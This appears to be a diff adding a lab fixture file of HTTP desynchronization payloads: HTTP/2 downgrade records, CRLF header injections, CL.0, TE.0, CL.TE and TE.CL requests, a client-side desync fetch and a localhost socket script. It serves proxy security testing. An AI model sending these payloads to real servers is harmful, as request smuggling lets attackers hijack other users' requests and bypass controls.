@@ -1,0 +1,53 @@
+# Modern HTTP Desynchronization Payloads
+# Isolated proxy/backend lab only. Literal \r\n denotes CRLF bytes; decode once.
+# HTTP/2 JSON records contain decoded headers and DATA for a protocol-aware client.
+
+# H2.CL: inconsistent content-length and DATA size
+{"headers":[[":method","POST"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/outer-cl"],["content-length","0"]],"data":"GET /desync-lab/marker-cl HTTP/1.1\r\nHost: desync.example.test\r\n\r\n"}
+
+# H2.TE: forbidden HTTP/2 transfer-encoding, expected rejection
+{"headers":[[":method","POST"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/outer-te"],["transfer-encoding","chunked"]],"data":"0\r\n\r\nGET /desync-lab/marker-te HTTP/1.1\r\nHost: desync.example.test\r\n\r\n"}
+
+# HTTP/2 CRLF field values; requires a protocol-aware lab client
+x-desync-marker: lab\r\nX-Desync-Injected: marker-one
+x-desync-marker: lab\r\nContent-Length: 0
+x-desync-marker: lab\r\nTransfer-Encoding: chunked
+
+# Authority / Host disagreement
+{"headers":[[":method","GET"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/authority"],["host","other-desync.example.test"]],"data":""}
+
+# Duplicate pseudo-header negative controls
+{"headers":[[":method","GET"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/first"],[":path","/desync-lab/second"]],"data":""}
+{"headers":[[":method","POST"],[":method","GET"],[":scheme","https"],[":authority","desync.example.test"],[":path","/desync-lab/method"]],"data":""}
+
+# CL.0: four-byte body followed by a controlled request on the same connection
+POST /desync-lab/ignore-body HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\nPINGGET /desync-lab/cl-zero-marker HTTP/1.1\r\nHost: desync.example.test\r\n\r\n
+
+# TE.0: valid chunk framing followed by a controlled request
+POST /desync-lab/ignore-chunks HTTP/1.1\r\nHost: desync.example.test\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n4\r\nPING\r\n0\r\n\r\nGET /desync-lab/te-zero-marker HTTP/1.1\r\nHost: desync.example.test\r\n\r\n
+
+# Duplicate Content-Length disagreement
+POST /desync-lab/conflicting-length HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: 4\r\nContent-Length: 0\r\n\r\nPING
+POST /desync-lab/reversed-length HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: 0\r\nContent-Length: 4\r\n\r\nPING
+
+# Content-Length parsing negative controls
+POST /desync-lab/invalid-length HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: invalid\r\n\r\nPING
+POST /desync-lab/signed-length HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: +4\r\n\r\nPING
+POST /desync-lab/comma-length HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: 4, 0\r\n\r\nPING
+
+# CL.TE: six body bytes; zero chunk plus a one-byte request prefix
+POST /desync-lab/cl-te HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG
+
+# TE.CL: chunked body versus four-byte Content-Length interpretation
+POST /desync-lab/te-cl HTTP/1.1\r\nHost: desync.example.test\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nPING\r\n0\r\n\r\n
+
+# Client-side desync browser control
+fetch('https://desync.example.test/desync-lab/browser-control',{method:'POST',mode:'no-cors',credentials:'omit',body:'DESYNC_BROWSER_MARKER'}).then(() => location.assign('https://desync.example.test/desync-lab/browser-followup'));
+
+# Pause-based local socket fixture: one pair, 250 ms pause
+import socket, time
+with socket.create_connection(('127.0.0.1', 8080), timeout=3) as desync_socket:
+    desync_socket.sendall(b'POST /desync-lab/pause HTTP/1.1\r\nHost: localhost\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n')
+    time.sleep(0.25)
+    desync_socket.sendall(b'PINGGET /desync-lab/pause-marker HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n')
+    print(desync_socket.recv(4096))
